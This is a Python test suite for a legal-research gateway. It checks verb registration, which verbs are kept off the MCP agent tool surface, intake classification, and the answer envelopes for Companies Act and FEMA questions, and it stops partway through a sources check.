"""The gate suite (`_test`) and the opt-in live smoke. Run: PYTHONPATH=. python3 gateway/verbs/__main__.py [--live]"""
from __future__ import annotations

from gateway.verbs import ask_layers, model_access
from gateway.verbs.answers import (_citations_for, _citations_from_summary, _envelope_for,
    _finding_blocks, _reread, verify_citation)
from gateway.verbs.ask import _ask, _ask_decomposed
from gateway.verbs.ask_layers import _apply_critic, _critic_enabled, cache_stats
from gateway.verbs.company import _events_assess
from gateway.verbs.conversation import (_draft_source, _intake_classify, _intake_origin,
    _task_args)
from gateway.verbs.core import (ARRAY, Context, Field, MCP_NAMESPACE, STRING, V2, Verb,
    _affirmed, mcp_name)
from gateway.verbs.documents import (VERIFY_CHECK_NAMES, VERIFY_NEEDS_PERMISSION,
    _document_check, _document_verify, _documents_upload)
from gateway.verbs.drafts import (_draft_create, _draft_prose, _draft_revise, _draft_status,
    _draft_versions)
from gateway.verbs.people import _future
from gateway.verbs.registry import VERBS, by_name, cli_spec, mcp_tools, rest_spec, write_verbs
from gateway.verbs.review import _review_contract, _review_document
from gateway.verbs.review_table import (MAX_GRID_CELLS, _parse_cell_reply, _review_grid_cell,
    _review_table_create, _review_table_status)
from gateway.verbs.run_records import SS_TEXTS, law_versions_of, nonconformity_for
from gateway.verbs.runs import (QUEUED_INTENTS, STORE_WRITING_INTENTS, _runs_approve,
    _runs_cancel, _runs_get, _runs_preview, _runs_reject, _runs_submit, _runs_trace,
    queue_handlers)
from gateway.verbs.vault import _vault_retry, _vault_upload


def _test() -> None:
    # ── this suite never touches the deployment's real budget ────────────────
    # `_review_table_create` reserves each cell's worst case through `_ledger()`, which is
    # backed by a FILE at corpus/.budget.json. With no worker running in a test, nothing
    # settles those reservations, so every create here held real budget until the day rolled
    # over -- 58 of them, ₹115.99 against a ₹116.67 cap, which starved an unrelated
    # `conversation.send` check and surfaced as a KeyError about FEMA1999.
    #
    # Redirected ONCE, for the whole suite, rather than per call site: the leak came from
    # pre-existing create tests that had no reason to know the verb had started reserving,
    # and a guard that every future test must remember is a guard that fails.
    import atexit as _atexit
    import os as _os_tmp
    import tempfile as _tempfile

    from backend.budget import BudgetTracker as _TestBT
    from backend.budget import FileStore as _TestFS

    _ledger_tmp = _tempfile.TemporaryDirectory()
    _atexit.register(_ledger_tmp.cleanup)
    _real_ledger_fn = model_access._ledger
    _ledger_calls = [0]

    def _test_ledger():
        """A FRESH tracker per call, each on its own file.

        One shared temporary tracker was tried first and ran out: every `create` reserves
        two cells' worst case and nothing settles them, so after about thirty creates the
        suite's own budget was exhausted and later creates refused NO_BUDGET -- which
        surfaced as "create with no store is refused" failing, because the budget guard
        runs before the store check.

        That is not only a test artefact. **An abandoned table holds its reservations until
        the day rolls over**, because only a worker settles a cell. research/TASKS.md A-016
        records it; one tracker per call is the right thing HERE because each check is a
        separate notional deployment-day, not thirty calls from one lawyer.
        """
        _ledger_calls[0] += 1
        return _TestBT(store=_TestFS(
            _os_tmp.path.join(_ledger_tmp.name, f"budget-{_ledger_calls[0]}.json")))

    model_access._ledger = _test_ledger

    ok = fail = 0

    def check(cond: bool, label: str) -> None:
        nonlocal ok, fail
        if cond:
            ok += 1
            print(f"  [PASS] {label}")
        else:
            fail += 1
            print(f"  [FAIL] {label}")

    rest, cli, mcp = rest_spec(), cli_spec(), mcp_tools()
    names = {v.name for v in VERBS}

    check(names == {"ask", "research.multi", "forecast.summary",
                    "review_contract", "review_document", "events.assess",
                    "runs.get", "runs.trace", "runs.approve", "runs.reject",
                    "runs.submit", "runs.cancel", "documents.upload",
                    "sources.list", "sources.search", "research.cases", "research.web", "company_facts.extract",
                    "intake.classify", "conversation.send", "conversation.list",
                    "conversation.get", "citation.get", "review_table.create",
                    "review_table.status", "review_table.export",
                    "review_table.cancel", "review_table.list", "draft.create",
                    "draft.revise", "draft.status", "draft.list", "draft.versions", "draft.diff",
                    "draft.export", "matters.create", "matters.list",
                    "calendar.upcoming", "usage.status", "jobs.dead",
                    # move 16 (T4).
                    "runs.preview",
                    # move 8 and move 10 (T3).
                    "document.verify", "document.check"} | {
                        "vault.upload", "vault.status", "vault.find", "vault.list",
                                            "vault.verify", "vault.summarize",
                                            "vault.research", "vault.compile",
                                            "vault.delete", "vault.retry"} | {
                        # 026: sign-in, sessions, invites.
                        "auth.login", "auth.logout", "auth.me",
                        "invites.create", "invites.accept"} | {
                        # 036: the Team page's people and pending invites.
                        "people.list", "invites.list", "invites.cancel"} | {
                        # 028: administering per-matter access.
                        "matters.grant", "matters.revoke", "matters.members",
                        "matters.access_report", "vault.share", "access.reassign"} | {
                        # 032: the firm's company profile.
                        "company_profile.get", "company_profile.set"},
          f"the sixty-nine verbs are declared once ({sorted(names)})")
    # sources.* are READ-ONLY, so they reach MCP. That is the intended shape: an agent may
    # ask what a source permits and search what may be read, and there is no sources verb
    # that fetches, stores or spends. S3's Indian Kanoon connector will spend money, and
    # will be a separate verb argued for separately.
    check({f"{MCP_NAMESPACE}.sources.list", f"{MCP_NAMESPACE}.sources.search"}
          <= {t.name for t in mcp},
          "...and both sources verbs reach MCP, being read-only")
    # Every verb that WRITES, named rather than counted, so adding one is a deliberate edit
    # to this line. All five are kept out of MCP by mcp_tools() for the same reason: a tool
    # surface that can submit, cancel or approve is one that can act with nobody present.
    check(set(write_verbs()) == {"documents.upload", "runs.approve", "runs.reject",
                                 "runs.submit", "runs.cancel", "conversation.send",
                                 "review_table.create", "review_table.cancel",
                                 "draft.create", "draft.revise", "matters.create",
                                 "vault.upload", "vault.delete", "vault.retry",
                                 # T3 move 10. It WRITES: an append-only row in
                                 # `document_checks` recording a judgement a firm may rely
                                 # on. LAWYER in gateway/roles.py for the same reason.
                                 "document.check",
                                 # 026. auth.login mints a session and writes a
                                 # login_attempts row; auth.logout revokes one;
                                 # invites.create writes an invite; invites.accept spends
                                 # one and creates an actor. All four are kept off MCP by
                                 # mcp_tools() for the same reason as every other write
                                 # here -- plus two of them are PUBLIC_VERBS, which have
                                 # no role to check and no business in an agent's toolbox.
                                 "auth.login", "auth.logout", "invites.create",
                                 "invites.accept",
                                 # 036. Withdraws an invite (marks it; never deletes).
                                 "invites.cancel",
                                 # 028. Each changes who may reach a matter or a document.
                                 "matters.grant", "matters.revoke", "vault.share",
                                 "access.reassign",
                                 # 032. Saves the firm's confirmed company facts.
                                 "company_profile.set"},
          f"...and exactly twenty-five of them write ({sorted(write_verbs())})")
    check(f"{MCP_NAMESPACE}.conversation.send" not in {t.name for t in mcp},
          "conversation.send WRITES -- it creates a thread, appends messages and may "
          "enqueue work -- so mcp_tools() keeps it off MCP, by rule and not by the author "
          "remembering")
    for ro in ("conversation.list", "conversation.get", "citation.get"):
        check(ro not in write_verbs() and f"{MCP_NAMESPACE}.{ro}" in {t.name for t in mcp},
              f"...while {ro} is read-only and does reach MCP")
    check(not {t.name for t in mcp} & {f"{MCP_NAMESPACE}.runs.submit",
                                       f"{MCP_NAMESPACE}.runs.cancel"},
          "...so neither runs.submit nor runs.cancel reaches MCP")

    # ── intake.classify (PLAN_23 layer 1) ───────────────────────────────────
    check("intake.classify" not in write_verbs(),
          "intake.classify is read-only, so it reaches MCP")
    check(f"{MCP_NAMESPACE}.intake.classify" in {t.name for t in mcp},
          "...and it does")
    _ictx = Context()
    _i = by_name()["intake.classify"].run(
        {"message": "Please review the attached share purchase agreement.",
         "files": [{"name": "spa-final.docx", "type": "application/pdf"}]}, _ictx)
    check(_i["task"] == "REVIEW_CONTRACT", f"a contract with a review verb -> "
                                           f"REVIEW_CONTRACT ({_i['task']})")
    check("run_id" not in _i and _ictx.last_steps == [],
          "**the verb never runs the task**: no run_id comes back and no step was built")
    check(len(_i["alternatives"]) == 2 and _i["reason"],
          f"...with two alternatives and a reason ({_i['alternatives']})")
    _u = by_name()["intake.classify"].run(
        {"files": [{"name": "board-minutes.pdf", "type": "application/pdf"}]}, _ictx)
    check(_u["task"] == "NEEDS_CLARIFICATION" and len(_u["options"]) == 2
          and _u["question"].endswith("?"),
          f"minutes with no instruction -> NEEDS_CLARIFICATION, two options, one question "
          f"({_u['task']})")
    check("alternatives" not in _u,
          "...and the undecided shape carries `options`, never `alternatives`")
    _e = by_name()["intake.classify"].run(
        {"message": "We are allotting shares to a new investor next week."}, _ictx)
    check(_e["task"] == "EVENT_ASSESS" and _e["event"] == "share_allotment",
          f"an event stated -> EVENT_ASSESS naming the event ({_e.get('event')})")
    _o = by_name()["intake.classify"].run(
        {"message": "Under the IBC, what is the CIRP timeline?"}, _ictx)
    check(_o["task"] in [t for t in __import__("agents.intake", fromlist=["TASKS"]).TASKS],
          f"an unheld-body question still CLASSIFIES ({_o['task']}) -- the refusal belongs "
          f"to the ask path, and intake does not duplicate it")
    check(by_name()["intake.classify"].run({}, _ictx)["status"] == "REFUSED",
          "nothing to classify is a BAD_REQUEST, not an empty classification")

    # ── C2: the conversation layer ──────────────────────────────────────────
    from gateway import envelope as _ev
    from gateway.store import MemoryBackend as _MB
    _st = _MB()
    _cctx = Context(store=_st, clock=lambda: "2026-10-01T00:00:00+00:00")
    _V = by_name()
    from agents import research_question as _rq_c2

    def _csend(args: dict) -> dict:
        """conversation.send with the deterministic research stand-in, on the SHARED store.

        A RESEARCH_QUESTION calls a model. With no stand-in the gate made a REAL, load
        -sensitive call that raised under load and returned FAILED with empty bodies -- the
        flake. The stand-in quotes the question's REAL retrieved sources, so retrieval, scope
        and the envelope all still run; only the model is deterministic, exactly as the other
        gate checks do via `_send_research`. No `text` (or no retrievable law) -> no stand-in,
        so non-research turns and abstentions are unchanged.
        """
        _srcs = tuple(s for s, _o in _rq_c2.evidence(args.get("text", "")))
        _ctx = Context(store=_st, clock=lambda: "2026-10-01T00:00:00+00:00",
                       model_for=((lambda _o: _rq_c2.quoting_model(_srcs)) if _srcs else None))
        return _V["conversation.send"].run(args, _ctx)

    # The envelope validates for every task conversation.send can produce.
    _r = _csend({"text": "What is the quorum for a meeting of the Board?"})
    _cid = _r["conversation_id"]
    _e = _r["envelope"]
    check(_ev.errors(_e) == [], f"conversation.send returns a VALID envelope ({_ev.errors(_e)})")
    check(_e["schema"] == _ev.SCHEMA_ID, f"...stamped {_ev.SCHEMA_ID}")
    check(_e["task"] == "RESEARCH_QUESTION" and _e["as_of"] == "2026-10-01",
          f"...with the task and the as_of date ({_e['task']}, {_e['as_of']})")
    check([b["body_id"] for b in _e["bodies"]] == ["CA2013"],
          f"...and CA2013 in bodies ({[b['body_id'] for b in _e['bodies']]})")

    for _t, _args in [("RESEARCH_QUESTION", {"text": "What is the quorum for the Board?"}),
                      ("EVENT_ASSESS", {"text": "We are allotting shares next week.",
                                        "event": "share_allotment"}),
                      ("COMPANY_STANDING", {"text": "Are we compliant with our filings?"}),
                      ("LAW_CHANGES", {"text": "What changed in the Act since April 2024?"})]:
        _o = _csend({**_args, "conversation_id": _cid})
        check(_ev.errors(_o["envelope"]) == [],
              f"the envelope validates for {_t} ({_ev.errors(_o['envelope'])[:1]})")
        check(_o["envelope"]["task"] == _t, f"...and its task is {_t}")

    # A task with no verb ABSTAINS and says so, rather than returning an empty answer.
    _cs = _V["conversation.send"].run(
        {"conversation_id": _cid, "text": "Are we compliant with our annual filings?"}, _cctx)
    check(_cs["envelope"]["status"] == _ev.ABSTAINED
          and "cannot answer one yet" in _cs["envelope"]["text_blocks"][0]["text"],
          "a task no verb serves ABSTAINS and says so in words -- an empty answer would "
          "read as 'no obligation found'")
    check(_cs["envelope"]["bodies"] == [],
          "...and claims nothing about any body")

    # A CA2013 + FEMA question is PARTIAL with FEMA NOT_HELD.
    from checker import scope as _scope
    _mixed = _ev.build(
        status=_ev.PARTIAL, task="RESEARCH_QUESTION", as_of="2026-10-01",
        text_blocks=[{"text": "The Act's allotment return is filed.", "citation_ids": []}],
        bodies=[_ev.body("CA2013", _scope.body("CA2013").name, _ev.B_ANSWERED, "held"),
                _ev.body("FEMA1999", _scope.body("FEMA1999").name, _ev.B_NOT_HELD,
                         _scope.refusal_for("FEMA1999"))])
    check(_mixed["status"] == "PARTIAL", "a CA2013 + FEMA envelope is PARTIAL")
    _bi = {b["body_id"]: b["status"] for b in _mixed["bodies"]}
    check(_bi == {"CA2013": "ANSWERED", "FEMA1999": "NOT_HELD"},
          f"...CA2013 ANSWERED and FEMA1999 NOT_HELD ({_bi})")
    check(_scope.body("FEMA1999").status == _scope.DECLARED,
          "...and NOT_HELD is read from checker/scope.py, not asserted here")

    # A scanned PDF shows CANNOT_READ with a reason.
    _scan = _V["documents.upload"].run(
        {"name": "scan0001.pdf",
         "cannot_read": "no text layer on any of 1 page(s); this looks like a scan"}, _cctx)
    check(_scan["state"] == "CANNOT_READ" and _scan["reason"],
          f"a scan uploads as CANNOT_READ with its reason ({_scan['state']})")
    _sr = _V["conversation.send"].run(
        {"conversation_id": _cid, "text": "Please review this.",
         "file_ids": [_scan["document_id"]]}, _cctx)
    _f = _sr["envelope"]["files"][0]
    check(_f["state"] == "CANNOT_READ" and "text layer" in (_f["reason"] or ""),
          f"...and the envelope's file panel shows CANNOT_READ with the reason "
          f"({_f['state']}, {(_f['reason'] or '')[:34]!r})")
    check(_ev.errors(_sr["envelope"]) == [], "...and that envelope validates")
    _real = _V["documents.upload"].run(
        {"text": "MINUTES OF THE BOARD MEETING. Present: three directors.",
         "name": "minutes.pdf"}, _cctx)
    _rr = _V["conversation.send"].run(
        {"conversation_id": _cid, "text": "Please review the minutes.",
         "file_ids": [_real["document_id"]]}, _cctx)
    check(_rr["envelope"]["files"][0]["state"] == "READ",
          f"...while a document that WAS read shows READ -- the first version of this "
          f"reported every real upload as unreadable "
          f"({_rr['envelope']['files'][0]['state']})")
    _unknown = _V["conversation.send"].run(
        {"conversation_id": _cid, "text": "Review this.", "file_ids": ["0" * 64]}, _cctx)
    check(_unknown["envelope"]["files"][0]["state"] == "CANNOT_READ",
          "...and a file_id we hold nothing for is CANNOT_READ, never omitted")
    check(_V["documents.upload"].run({"name": "x.pdf", "cannot_read": "bad"},
                                     _cctx)["status"] == "REFUSED",
          "a cannot_read with no real reason is refused: 'unreadable' with no why invites "
          "the reader to assume the document was empty")

    # A transport error gives FAILED, and FAILED is never a refusal.
    _fail = _envelope_for("RESEARCH_QUESTION",
                          {"status": "FAILED", "error": "ReadTimeout: provider"},
                          as_of="2026-10-01", run_id=None, files=[], ctx=_cctx)
    check(_fail["status"] == "FAILED" and _ev.errors(_fail) == [],
          "a transport error becomes a valid FAILED envelope")
    check(not _ev.is_refusal(_fail) and _fail["bodies"] == [] and _fail["citations"] == [],
          "...and FAILED is NOT a refusal, and carries no bodies and no citations")
    check("not a finding about the law" in _fail["text_blocks"][0]["text"],
          "...and says so in words")

    # R-018: a question whose picked sources EXCLUDE the held corpus must ABSTAIN with ask's
    # own reason -- never "See the findings." over a held body falsely reported as searched
    # and empty. `ask` abstains; the envelope must carry that, word for word.
    _unpicked = _ask({"question": "How many meetings of the Board must a company hold "
                      "under section 173?", "sources": ["vault"]}, _cctx)
    check(_unpicked["status"] == _ev.ABSTAINED,
          f"held un-picked: ask ABSTAINS ({_unpicked['status']})")
    _uenv = _envelope_for("RESEARCH_QUESTION", _unpicked, as_of="2026-10-01", run_id=None,
                          files=[], ctx=_cctx, question="s.173 board meetings")
    check(_uenv["status"] == _ev.ABSTAINED, "...the envelope is ABSTAINED")
    check("not a finding that no obligation exists" in str(_uenv["text_blocks"]),
          "...carrying ask's abstention reason, not 'See the findings.'")
    check("See the findings." not in str(_uenv["text_blocks"]),
          "...so the reader is told WHY nothing was read, not pointed at absent findings")
    _ca = next((b for b in _uenv["bodies"] if b["body_id"] == "CA2013"), None)
    check(_ca is not None and _ca["status"] == _ev.B_NOT_ENGAGED,
          f"...and the held body is NOT_ENGAGED (not searched), not NEED_FACT 'nothing "
          f"found' ({_ca and _ca['status']})")

    # ── model-shortfall vs abstention: NO_MODEL / NOTHING_TRACED / NO_EVIDENCE each distinct ──
    # NO_MODEL (a dead provider) is a could-not-run state, NOT an abstention: FAILED register,
    # its own message, no bodies -- so a cold start never reads as "nothing held answers this".
    _nm = _envelope_for("RESEARCH_QUESTION",
                        {"status": "REFUSED", "code": "NO_MODEL", "detail": "no provider",
                         "provisions": ["Companies Act 2013, s.173"]},
                        as_of="2026-10-01", run_id="r", files=[], ctx=_cctx, question="s.173")
    check(_nm["status"] == _ev.FAILED and not _ev.is_refusal(_nm),
          f"NO_MODEL renders in the FAILED register, not as an abstention ({_nm['status']})")
    check("model was unavailable" in _nm["text_blocks"][0]["text"] and _nm["bodies"] == [],
          "...with its own message and NO body claiming the held law was read")

    # NOTHING_TRACED: provisions found, nothing traced -- say so, and list them as OPENABLE
    # citations (verbatim via citation.get); never "nothing on point was found".
    _nt = _envelope_for("RESEARCH_QUESTION",
                        {"status": "REFUSED", "code": "NOTHING_TRACED",
                         "provisions": ["Companies Act 2013, s.173"]},
                        as_of="2026-10-01", run_id="r", files=[],
                        ctx=_cctx, question="How many board meetings must a company hold?")
    check(_nt["status"] == _ev.ABSTAINED
          and "no sentence could be traced" in _nt["text_blocks"][0]["text"],
          f"NOTHING_TRACED abstains and says the provisions were found but nothing traced "
          f"({_nt['status']})")
    check(len(_nt["citations"]) >= 1 and _nt["citations"][0]["provision"] == "s.173"
          and _nt["citations"][0]["quote"].strip() != "",
          f"...listing retrieved provisions as openable, verbatim citations "
          f"({len(_nt['citations'])})")
    _ntb = next((b for b in _nt["bodies"] if b["body_id"] == "CA2013"), None)
    check(_ntb is not None and "no sentence could be traced" in _ntb["note"]
          and "nothing on point was found" not in _ntb["note"],
          f"...and the held body says found-not-traced, never 'nothing on point was found' "
          f"({_ntb and _ntb['note'][:40]})")

    # NO_EVIDENCE (nothing retrieved) keeps "nothing on point was found in the held law".
    _ne = _envelope_for("RESEARCH_QUESTION",
                        {"status": "REFUSED", "code": "NO_EVIDENCE", "provisions": []},
                        as_of="2026-10-01", run_id="r", files=[],
                        ctx=_cctx, question="How many board meetings must a company hold?")
    _neb = next((b for b in _ne["bodies"] if b["body_id"] == "CA2013"), None)
    check(_ne["status"] == _ev.ABSTAINED and _neb is not None
          and "nothing on point was found" in _neb["note"],
          "NO_EVIDENCE still says nothing on point was found in the held law")

    # (The refusal/failure code riding the conversation RESPONSE as a sibling is exercised by
    # the live integration test; here the envelope rendering for each code is what matters.)

    # The thread, in order, with the envelope stored.
    _g = _V["conversation.get"].run({"conversation_id": _cid}, _cctx)
    check([m["ordinal"] for m in _g["messages"]]
          == list(range(len(_g["messages"]))),
          "conversation.get returns the messages in ordinal order with no gaps")
    check(all(m["envelope"] is None for m in _g["messages"] if m["role"] == "user"),
          "...a user message never carries an envelope")
    check(all(m["envelope"] is not None for m in _g["messages"]
              if m["role"] == "assistant"),
          "...and every assistant message here does")
    # 8b: a listing is scoped to ONE matter, so the thread has to be filed to see it.
    _MT = _V["matters.create"].run({"name": "conformance matter"}, _cctx)["matter_id"]
    _cctx.store.write_conversation({"conversation_id": _cid, "title": "t",
                                    "matter_id": _MT})
    check(any(c["conversation_id"] == _cid
              for c in _V["conversation.list"].run({"matter_id": _MT},
                                                   _cctx)["conversations"]),
          "conversation.list shows the thread filed to that matter")
    check(_V["conversation.list"].run({}, _cctx)["code"] == "BAD_REQUEST",
          "**listing with NO matter_id is REFUSED** -- there is no 'all matters' listing, "
          "because a list of every client's work is the accident 8b exists to prevent")
    _MT2 = _V["matters.create"].run({"name": "another matter"}, _cctx)["matter_id"]
    check(not _V["conversation.list"].run({"matter_id": _MT2},
                                          _cctx)["conversations"],
          "...and a DIFFERENT matter does not show it: no cross-matter listing")
    check(_V["matters.create"].run({"name": "conformance matter"},
                                   _cctx)["status"] == "REFUSED",
          "a duplicate matter name is refused")
    check(_V["matters.create"].run({"name": "  "}, _cctx)["status"] == "REFUSED",
          "a matter with no name is refused")
    check({m["name"] for m in _V["matters.list"].run({}, _cctx)["matters"]}
          >= {"conformance matter", "another matter"},
          "matters.list shows the firm's matters")
    check(not by_name()["matters.list"].mcp and by_name()["matters.list"].read_only,
          "**matters.list is read-only and NOT an MCP tool**: a client list names who the "
          "firm acts for, and no agent task needs it. read_only is about whether a call "
          "changes anything; mcp is about whether a tool may ask at all")
    check("matters.list" not in {t.name.split(".", 1)[-1] for t in mcp_tools()}
          and len(mcp_tools()) == 21,
          f"...and it really is absent from the generated tool list ({len(mcp_tools())})")
    check(_V["conversation.get"].run({"conversation_id": "nope"}, _cctx)["status"]
          == "REFUSED", "an unknown conversation is REFUSED, not an empty thread")
    check(_V["conversation.send"].run({}, _cctx)["status"] == "REFUSED",
          "a send with neither text nor a file is refused")
    check(_V["conversation.send"].run({"text": "x", "task_override": "SUMMARISE"},
                                      _cctx)["status"] == "REFUSED",
          "a task_override outside the six is refused")
    _ov = _V["conversation.send"].run(
        {"conversation_id": _cid, "text": "anything at all",
         "task_override": "RESEARCH_QUESTION"}, _cctx)
    check(_ov["envelope"]["task"] == "RESEARCH_QUESTION"
          and _ov["classification"]["decided_by"] == "override",
          "...and a valid override skips intake, recorded as decided_by=override")
    check(_V["conversation.send"].run({"text": "x"}, Context())["status"] == "REFUSED",
          "a send with no store is REFUSED -- returning a thread that vanishes on restart "
          "would be a lie about what was saved")

    # citation.get re-verifies rather than trusting the stored envelope.
    check(_V["citation.get"].run({"citation_id": "c1"}, _cctx)["status"] == "REFUSED",
          "citation.get without a conversation_id is refused: the read is governed by the "
          "tenant's own policy on that thread")
    check(_V["citation.get"].run({"citation_id": "nope", "conversation_id": _cid},
                                 _cctx)["status"] == "REFUSED",
          "...and an unknown citation id is REFUSED, never an empty citation")

    # ══ REVIEW FINDINGS ON PR #27 ════════════════════════════════════════════

    # ── 1. the model must be REACHABLE, checked against the real pre-send guard ─
    # `_served_or_refusal((), ...)` passed NO origin, and `public_only.verify_prompt`
    # refuses a prompt with no origin to clear against -- so the classifier could never be
    # called, and every unmatched message came back NEEDS_CLARIFICATION because of
    # NotPublic. The user's own typed words are MATTER text, not published corpus text,
    # and clear_matter is the path for them.
    from agents import intake as _ik
    from checker import public_only as _po
    _msg = "zzz mmm"
    _org = _intake_origin(_msg)
    check(_org is not None and _org.basis == _po.MATTER,
          f"the intake classifier clears the user's message as MATTER text "
          f"({getattr(_org, 'basis', None)})")
    # THE REAL PRE-SEND CHECK. No stub: this is the function azure_model.narrate calls.
    _cleared = _po.verify_prompt(_ik.prompt_for(_msg), _org)
    check(len(_cleared) == 1 and _msg in _cleared[0],
          f"...and the REAL verify_prompt clears the classification prompt against it "
          f"({len(_cleared)} block(s))")
    try:
        _po.verify_prompt(_ik.prompt_for(_msg), ())
        check(False, "...while no origin is refused, which is what used to happen")
    except _po.NotPublic as e:
        check("nothing to clear" in str(e),
              f"...while NO origin is refused by that same guard ({e!s:.44}) -- the bug")
    _ic = by_name()["intake.classify"].run({"message": _msg}, Context())
    check(_ic["task"] != "NEEDS_CLARIFICATION",
          f"an unmatched message never comes back NEEDS_CLARIFICATION for want of a "
          f"clearance; it reaches the model or falls back to RESEARCH_QUESTION "
          f"(got {_ic['task']} by {_ic['rule']})")
    check(_ic["task"] == "RESEARCH_QUESTION", f"...here, the fallback ({_ic['task']})")

    # ── 5. a list field is declared ARRAY, and MCP says so ──────────────────
    _by = {v.name: v for v in VERBS}
    _arr = [(v.name, f.name) for v in VERBS for f in v.inputs if f.kind == ARRAY]
    check(("intake.classify", "files") in _arr,
          f"intake.classify.files is declared ARRAY, not OBJECT -- it takes a list "
          f"({_arr})")
    _schemas = {t.name: t.schema for t in mcp_tools()}
    _s = _schemas[f"{MCP_NAMESPACE}.intake.classify"]["properties"]["files"]
    check(_s["type"] == "array",
          f"...and the MCP inputSchema says array, matching what the verb accepts "
          f"({_s['type']!r})")
    for _vn, _fn in _arr:
        _t = _schemas.get(f"{MCP_NAMESPACE}.{_vn}")
        if _t is None:                      # a write verb: not on MCP at all
            continue
        check(_t["properties"][_fn]["type"] == "array",
              f"{_vn}.{_fn}: MCP declares array, matching the handler")
    # And a field declared ARRAY must actually be refused when handed an object.
    check(by_name()["intake.classify"].run(
              {"message": "x", "files": {"name": "a.pdf"}}, Context())["status"]
          == "REFUSED",
          "a field declared ARRAY is REFUSED when handed an object, so the declaration "
          "and the handler agree")

    # ── 6. a non-string message is BAD_REQUEST, not a 500 ───────────────────
    for _bad in (5, 5.5, True, {"a": 1}, ["x"]):
        _r6 = by_name()["intake.classify"].run({"message": _bad}, Context())
        check(_r6.get("status") == "REFUSED" and _r6.get("code") == "BAD_REQUEST",
              f"message={_bad!r} is BAD_REQUEST, not an exception "
              f"({_r6.get('status')}/{_r6.get('code')})")
    check(by_name()["intake.classify"].run({"message": None,
                                            "files": [{"name": "nda.docx"}]},
                                           Context())["task"] in
          ("NEEDS_CLARIFICATION", "REVIEW_CONTRACT"),
          "...while message=None with a file is still classified: absent is not malformed")

    # ── 7 (caller side). One classify call, no rule-name matching ───────────
    _src = __import__("inspect").getsource(_intake_classify)
    check("default_no_attachment" not in _src
          and "attachment+unrecognised_instruction" not in _src,
          "the verb no longer matches intake's RULE NAMES to guess whether a model is "
          "wanted -- that coupled the gateway to the module's internals")
    check(_src.count("intake.classify(") == 1,
          f"...and calls classify() exactly ONCE, so the rules cannot disagree with "
          f"themselves between two runs ({_src.count('intake.classify(')})")
    check("model_provider" in _src,
          "...passing a model_provider, which classify() calls lazily and only if the "
          "rules did not decide")

    # ══ C2 GAPS, found by auditing the envelope against the spec ═════════════
    # Measured before any of this was written: citations[] was 0 for every task, bodies[]
    # empty for four of six, READING and PARTIAL and NEEDS_LAWYER never produced, and
    # `_bodies_from_ask` read two keys (`out_of_scope_bodies`, `refusal`) that the `ask`
    # verb does not return -- so the FEMA branch was dead code and the spec's own named
    # case failed end to end.
    _gctx = Context(store=_MB(), clock=lambda: "2026-10-01T00:00:00+00:00", synthetic_fixtures=True)
    _gV = by_name()

    def _send(**kw):
        return _gV["conversation.send"].run({"conversation_id": "c-gap", **kw}, _gctx)

    # ── STEP 4a: deterministic model STAND-INS, always, in the gate ──────────
    # These checks exercise conversation.send end to end, and that path needs a model to
    # turn a retrieval into a cited answer. A real model made the gate depend on a live key:
    # keyed it passed, keyless (a fresh clone) it ABSTAINED. The fix is a stand-in that
    # replaces ONLY the model -- retrieval, quote byte-matching, the critic and the envelope
    # all run for real -- so the SAME test runs on every machine and the gate makes no paid
    # call. The real provider is exercised by `scripts/run_tests.sh --live`, off the floors.
    #
    # Each stand-in quotes REAL text and never invents: the research one quotes the sections
    # retrieval actually returned (`research_question.quoting_model`); the contract one
    # extracts nothing (an honest empty review), and NEEDS_LAWYER follows from the DRAFT
    # playbook, not from anything the model said -- which is why no invented clause is needed.
    from agents import research_question as _rq_stub

    def _send_research(**kw):
        """conversation.send with a research stand-in that quotes the query's real evidence.

        With no retrievable held law the evidence is empty and no stand-in is supplied, so the
        path ABSTAINS exactly as it should -- the stand-in can only ever quote what retrieval
        truly found."""
        srcs = tuple(s for s, _o in _rq_stub.evidence(kw.get("text", "")))
        ctx = Context(store=_MB(), clock=lambda: "2026-10-01T00:00:00+00:00",
                      model_for=((lambda _o: _rq_stub.quoting_model(srcs)) if srcs else None))
        return _gV["conversation.send"].run({"conversation_id": "c-gap", **kw}, ctx)

    def _send_contract(**kw):
        """conversation.send with a contract stand-in that extracts nothing -- it invents no
        clause. NEEDS_LAWYER comes from the DRAFT playbook, as review_contract's own suite
        shows (`review(..., model=lambda p: "{}")`).

        Reuses `_gctx`'s store AND its `documents` map, because the contract being reviewed
        was uploaded into them (`documents.upload` writes to `ctx.documents`): a fresh context
        would not hold the file_id and the turn would ask for clarification instead."""
        ctx = Context(store=_gctx.store, documents=_gctx.documents,
                      clock=lambda: "2026-10-01T00:00:00+00:00",
                      model_for=lambda _o: (lambda _prompt: "{}"), synthetic_fixtures=True)
        return _gV["conversation.send"].run({"conversation_id": "c-gap", **kw}, ctx)

    # ── the spec's named case: CA2013 + FEMA -> PARTIAL, FEMA NOT_HELD ──────
    # PARTIAL means part was ANSWERED and part was not held, so the question has to be one
    # the Act really answers part of. This one is: the quorum is s.174, and FEMA is named
    # alongside it.
    _mx = _send_research(text="What is the quorum for a meeting of the Board under the "
                              "Companies Act, and does FEMA affect it?")["envelope"]
    _mb = {b["body_id"]: b for b in _mx["bodies"]}
    check(_mx["status"] == "PARTIAL",
          f"a CA2013 + FEMA question is PARTIAL end to end, through conversation.send "
          f"(got {_mx['status']})")
    check(_mb.get("FEMA1999", {}).get("status") == "NOT_HELD",
          f"...with FEMA1999 NOT_HELD ({sorted(_mb)})")
    check("CA2013" in _mb and _mb["CA2013"]["status"] == _ev.B_ANSWERED,
          f"...and CA2013 ANSWERED ({_mb.get('CA2013', {}).get('status')})")
    from checker import scope as _sc
    check(_mb["FEMA1999"]["note"] == _sc.refusal_for("FEMA1999"),
          "...and FEMA's note is the REGISTER'S OWN refusal text, not a sentence composed "
          "here")

    # ── the source picker's report rides the conversation RESPONSE, beside the envelope ──
    # The console Ask (conversation.send) needs "which sources were searched"; the versioned
    # answer_envelope.v1 cannot carry it, so it travels as a sibling of the envelope.
    _src = _send_research(text="What is the quorum for a meeting of the Board?",
                          sources=["held"])
    check(_src.get("sources", {}).get("searched") == ["held"],
          f"a research turn carries the per-source report on the RESPONSE "
          f"({_src.get('sources', {}).get('searched')})")
    _hrow = next((r for r in _src.get("sources", {}).get("report", []) if r["id"] == "held"),
                 None)
    check(_hrow is not None and _hrow["outcome"] == "SEARCHED_HITS",
          f"...held reports SEARCHED_HITS through conversation.send ({_hrow})")
    check("sources" not in _src["envelope"],
          "...and the versioned envelope is untouched -- the report is a sibling, not in it")

    # ── licensed research and DMS integrations are explicit, distinct and fail closed ──
    _catalog = by_name()["sources.list"].run({}, Context())
